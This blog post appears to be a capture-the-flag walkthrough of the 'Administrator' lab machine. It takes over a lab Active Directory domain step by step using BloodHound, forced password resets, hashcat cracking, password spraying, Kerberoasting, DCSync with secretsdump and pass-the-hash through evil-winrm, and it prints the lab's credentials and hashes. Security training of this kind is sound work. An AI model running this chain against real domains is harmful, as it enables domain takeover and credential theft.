---
layout: post
title: "Administrator"
date: 2025-04-25 
categories: ctf
---
# Administrator

First let’s enumerate the open ports:

```bash
sudo nmap -sC -sV 10.10.11.42

result:
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-24 17:28:11Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-04-24T17:28:16
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m00s
```

From this, we know the domain name is administrator.htb. Let’s add that to our /etc/hosts file.

Let’s try to login to FTP with Olivia’s credentials and see what files are available to us:

```bash
ftp 10.10.11.42

result:
Access Denied.
```

Since we were given a credential, we can map out the AD structure with bloodhound:

```bash
mkdir bloodhound_output
bloodhound-python -u Olivia -p 'ichliebedich' -ns 10.10.11.42 -d administrator.htb -c all

sudo neo4j start

bloodhound   #neo4j:neo4j
```

Starting from our user Olivia, we navigate to Node Info, scroll to Outbound Object Control, We see that we have GenericAll over Michael.

![image.png]({{ site.baseurl }}/assets/administrator/image.png)

By right-clicking on GenericAll, and clicking help, we can see how we can leverage this privilege. GenericAll means we have full control over the user, therefore the ability to change its password and log on as Michael. 

```bash
net rpc password "michael" "P@ssword123" -U "administrator.htb"/"Olivia"%"ichliebedich" -S "10.10.11.42"

#Now to see if the password change worked

nxc smb 10.10.11.42 -u michael -p 'P@ssword123'

results:
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\michael:P@ssword123
```

Let’s see what permission Michael has:

![image.png]({{ site.baseurl }}/assets/administrator/image%201.png)

Michael has ForceChangePassword, therefore, we also have control over the user Benjamin. Let’s change Benjamin’s password as well:

```bash
net rpc password "benjamin" "P@ssword123" -U "administrator.htb"/"michael"%"P@ssword123" -S "10.10.11.42"

#To check

nxc smb 10.10.11.42 -u benjamin -p 'P@ssword123'

result:
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\benjamin:P@ssword123
```

Marking Benjamin as owned, clicking on its First degree membership in node info, we see:

![image.png]({{ site.baseurl }}/assets/administrator/image%202.png)

A member of Share Moderators. Let’s see if Benjamin can access ftp:

```bash
ftp 10.10.11.42

dir

get Backup.psafe3

result:
WARNING! 3 bare linefeeds received in ASCII mode.
File may not have transferred correctly.

Let's try again in binary mode:

bin

get Backup.psafe3
```

Now let’s use hashcat to crack the password of the safe:

```bash
hashcat Backup.psafe3 rockyou.txt #tekieromucho
```

Let’s download the password safe app and see what passwords we find in the database:

```bash
sudo apt install passwordsafe

pwsafe
```

We see passwords for 3 users, let’s save each user in a users.txt file and each password in password.txt file, in the same order, then let’s see which passwords are valid:

```bash
nxc smb 10.10.11.42 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success

result:
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [-] administrator.htb\alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE
SMB         10.10.11.42     445    DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
SMB         10.10.11.42     445    DC               [-] administrator.htb\emma:WwANQWnmJnGV07WQN8bMS7FMAbj
```

We now have access to user Emily. Let’s login to Emily and submit the flag:

```bash
evil-winrm -i 10.10.11.42 -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
```

Now let’s see what permissions Emily has over other objects back on bloodhound.

![image.png]({{ site.baseurl }}/assets/administrator/image%203.png)

We can perform a kerberoast attack. Let’s download the suggested python script and carry out the attack

```bash
git clone https://github.com/ShutdownRepo/targetedKerberoast.git
targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'

result:
impacket.krb5.kerberosv5.KerberosError: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

Looks like we have to sync our machine to the same time as the target and run the attack again:

```bash
sudo ntpdate 10.10.11.42
```

Now we have the hash for ethan, let’s attempt to crack it again with hashcat.

```bash
hashcat -m 13100 share/ethan.krb rockyou.txt #limpbizkit
```

```bash
nxc smb 10.10.11.42 -u ethan -p limpbizkit
```

We now have control of ethan. Let’s see what permissions he has.

![image.png]({{ site.baseurl }}/assets/administrator/image%204.png)

We have DCSync permission which means we can copy the NTDS.dit database, which contains all the user’s hash. Let’s DCSync the domain.

```bash
impacket-secretsdump 'administrator.htb'/'ethan':'limpbizkit'@10.10.11.42
```

Now we have the adminstrator’s NT hash, we can perform pass-the-hash attack and log in as Administrator via evil-winrm:

```bash
evil-winrm -i 10.10.11.42 -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```